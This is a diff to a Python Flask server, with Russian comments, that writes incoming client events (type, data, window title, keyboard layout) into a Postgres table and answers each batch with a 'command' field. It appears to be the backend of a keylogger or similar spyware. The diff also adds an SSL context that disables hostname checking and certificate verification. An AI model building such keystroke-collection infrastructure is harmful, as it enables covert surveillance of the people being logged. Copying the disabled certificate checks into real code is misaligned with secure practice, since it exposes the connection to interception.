@@ -1,6 +1,7 @@
 import os
 import json
 import pg8000.dbapi
+import ssl
 from datetime import datetime
 from flask import Flask, request, jsonify
 from flask_socketio import SocketIO
@@ -15,18 +16,25 @@ def get_db_connection():
     if not DATABASE_URL:
         raise Exception("DATABASE_URL is missing")
     
-    # Парсим ссылку от Neon для pg8000
-    url = DATABASE_URL.replace("postgresql://", "").split("@")
+    # Убираем channel_binding из ссылки, так как мы сами настраиваем SSL
+    clean_url = DATABASE_URL.replace("&channel_binding=require", "")
+    
+    url = clean_url.replace("postgresql://", "").split("@")
     user_pass = url[0].split(":")
     host_db = url[1].split("/")
     host_port = host_db[0].split(":")
     
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+
     return pg8000.dbapi.connect(
         user=user_pass[0],
         password=user_pass[1],
         host=host_port[0],
         port=int(host_port[1]) if len(host_port) > 1 else 5432,
-        database=host_db[1].split("?")[0]
+        database=host_db[1].split("?")[0],
+        ssl_context=ssl_context
     )
 
 def init_db():
@@ -39,12 +47,12 @@ def init_db():
             timestamp TEXT,
             type TEXT,
             data TEXT,
-            window TEXT,
+            win_title TEXT,
             layout TEXT
         )''')
         conn.commit()
         conn.close()
-        print("[+] База данных успешно инициализирована!")
+        print("[+] БАЗА ДАННЫХ УСПЕШНО ПОДКЛЮЧЕНА!")
     except Exception as e:
         print(f"[-] Ошибка подключения к БД: {e}")
 
@@ -69,7 +77,7 @@ def log():
         c = conn.cursor()
 
         for ev in events:
-            c.execute('''INSERT INTO logs (event_id, timestamp, type, data, window, layout) 
+            c.execute('''INSERT INTO logs (event_id, timestamp, type, data, win_title, layout) 
                          VALUES (%s, %s, %s, %s, %s, %s) 
                          ON CONFLICT (event_id) DO NOTHING''', 
                       (event_id, timestamp, ev.get("type"), ev.get("data"), 
@@ -83,6 +91,7 @@ def log():
             })
 
         conn.commit()
+        print(f"[+] Записано {len(events)} событий в базу!")
         return jsonify({"status": "ok", "command": "none", "server_time": datetime.now().isoformat()})
         
     except Exception as e:
